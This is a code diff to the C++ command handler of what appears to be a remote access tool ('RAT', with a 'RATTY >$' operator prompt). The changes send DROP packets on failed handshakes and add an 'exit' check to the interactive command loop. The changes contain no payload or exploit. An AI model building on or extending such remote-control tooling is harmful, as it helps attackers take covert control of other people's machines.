@@ -128,15 +128,20 @@ bool Handler::Challenge() {
                 }
 
                 std::cerr << "[-] Invalid Reply Code! (" << replyCode << ")" << "\n";
+                RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
                 return false;
             }
             std::cerr << "[-] Recv no Data!" << "\n";
+            RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
             return false;
         }
         std::cerr << "[-] Invalid Message! (" << msg << ")" << "\n";
+        recvPacket.first.VisualizePacket();
+        RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
         return false;
     }
     std::cerr << "[-] Recv no Data!" << "\n";
+    RatPacketUtils::Send(rat_conn, RatPacket("", MsgType::DROP));
     return false;
 }
 
@@ -151,7 +156,7 @@ void Handler::Interact() {
         printf("RATTY >$ ");
         std::getline(std::cin, input);
         
-        if (!input.empty()) {
+        if (!input.empty() && input != "exit") {
             ProcessCommand(input);
 
             if (activeModule != nullptr) {
